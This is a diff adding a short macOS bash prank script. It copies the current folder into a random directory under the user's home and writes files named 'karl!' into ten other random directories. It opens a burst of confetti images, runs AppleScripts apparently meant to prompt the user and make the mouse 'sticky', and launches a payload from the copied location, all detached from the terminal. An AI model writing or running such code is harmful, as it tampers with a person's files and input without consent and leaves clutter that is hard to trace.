@@ -1,0 +1,15 @@
+#!/bin/bash
+
+newhomes="$(find $HOME -type d -depth 2 | shuf -n 11)"
+nhome=$(echo $newhomes | cut -d' ' -f1)
+cp -R $PWD $nhome
+for k in {2..11}; do printf 'h i k a r l' > $(echo $newhomes | cut -d' ' -f"$k")/karl!; done
+osascript prompt
+for k in {1..10}; do open -n confetti.png & disown; done
+sleep $((RANDOM % 88))
+osascript stickymouse & disown
+sleep $((RANDOM % 10))
+$nhome/superhappyfuntimes & disown
+exit
+
+
